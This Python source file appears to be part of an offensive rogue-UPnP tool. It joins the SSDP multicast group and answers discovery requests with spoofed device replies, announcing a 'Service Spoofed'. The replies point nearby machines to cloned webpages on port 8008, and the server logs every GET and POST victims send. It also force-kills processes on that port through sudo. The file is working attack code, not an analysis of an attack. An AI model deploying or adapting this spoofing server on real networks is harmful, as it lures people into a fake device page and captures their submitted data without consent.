import os, socket, signal, struct, re, socketserver,http
from email.utils import formatdate
from multiprocessing import Process
from time import sleep
from utils import utils
from end import *

local_ip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]

class logServer(http.server.SimpleHTTPRequestHandler):
    """
        This class logs all of the GET and POST received from the webpage and shows it on the terminal,
        allowing to the user to log all of the interactions.
    """
    def log_message(self, format, *args):
        print("\n\t%s -> [%s] -> %s\n" %
                         (self.address_string(),
                          self.log_date_time_string(),
                          format%args))

def gen_socket(self):
    """
        Creates a socket and sets it to the local network. This allows the server and the clone function to
        work.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = ('', 1900)
    sock.bind(server_address)
    group = socket.inet_aton('239.255.255.250')
    mreq = struct.pack('4s4s', group, socket.inet_aton(local_ip))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    return(sock)
sock = gen_socket(None)



class server:
    """
    Initialices the server and starts serving on the local network with the options found in the configuration file.\n
    It will keep serving until a close command is given (ctrl + c), if the user kills the process or this gets 
    an error, the server will keep running in the background, when the user aunch again the rogramm it will 
    automatiaclly detect if the server is still running and will try to kill it and relaunch it.
    """
    def __init__(self):
        
        os.system('clear')
        domain = utils.get_domain(None)
        web = utils.get_url(None)
        initialize_server = Process(target=server.searcher, args=(None,))
        web_server = Process(target=server.web_server, args=(None,))
        mdns_server = Process(target=utils.mdns_server, args=(None,domain,))
        os.system('clear')
        print("Starting server....")
        sleep(1)
        try:
            initialize_server.start()
            web_server.start()
            mdns_server.start()
            os.system('clear')
            print(
                'Server Started at: '+local_ip+':1900\n\n'
                '\tService .xml location: http://'+domain+':8008/ssdp.xml\n'
                '\tService name: '+utils.get_friendlyname(None)+'\n'
                '\tService URL: '+web+'\n'
                '\tService Spoofed: '+utils.get_service(None)+'\n'
                '\nServer log:\n'
            )
            signal.pause()
        except (BrokenPipeError, ConnectionResetError):
            pass
        except (KeyboardInterrupt, SystemExit):
            os.system('clear')
            BYE()
            initialize_server.terminate()
            web_server.terminate()
            mdns_server.terminate()
            
    def searcher(self):
        while True:
            data, addr = sock.recvfrom(1024)
            # Every time this gets looped, checks the incomming packages for the M-SEARCH header, 
            # if present it sends the necessary info to a function which answer to the packages.
            received_st = re.findall(r'(?i)\\r\\nST:(.*?)\\r\\n', str(data))
            if 'M-SEARCH' in str(data) and received_st:
                requested_st = received_st[0].strip()
                server.answerer(None, addr, requested_st)

    def answerer(self, addr, st):
        date_format = formatdate(timeval=None, localtime=False, usegmt=True)
        UUID = utils.get_uuid(None)
        ssdp_reply = ('HTTP/1.1 200 OK\r\n'
                      'CACHE-CONTROL: max-age=1800\r\n'
                      'DATE: '+date_format+'\r\n'
                      'EXT:\r\n'
                      'LOCATION: http://'+local_ip+':8008/ssdp.xml\r\n'
                      'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n'
                      '01-NLS: '+UUID+'\r\n'
                      'SERVER: UPnP/1.0\r\n'
                      'ST: '+st+'\r\n'
                      'USN: '+UUID+'::'+st+'\r\n'
                      'BOOTID.UPNP.ORG: 0\r\n'
                      'CONFIGID.UPNP.ORG: 1\r\n'
                      '\r\n\r\n'
                      )
        ssdp_reply = bytes(ssdp_reply, 'utf-8')
        sock.sendto(ssdp_reply, addr)

    def web_server(self):
        """
            The function that allows to server all the webpages and other files through http.
        """
        try:
            with socketserver.TCPServer(("", 8008), logServer) as httpd:
                httpd.allow_reuse_address = True
                httpd.serve_forever()
        except OSError:
            # When the server is closed badly (ctrl+Z or y errors) the port gets blocked, this error handling
            # tries to recover from that klling the blocked process and restarting the server.
            os.system('clear')
            print(
            'Seems that the server is still running in the background and the programm can´t\n'
            'continue, you will be asked for your sudo password to terminate the server and\n'
            'try again.\n\n'
            )
            os.system('sudo lsof -t -i tcp:8008 | xargs kill -9')
            sleep(1)
            os.system('sudo lsof -t -i tcp:8008 | xargs kill -9')   
            server()
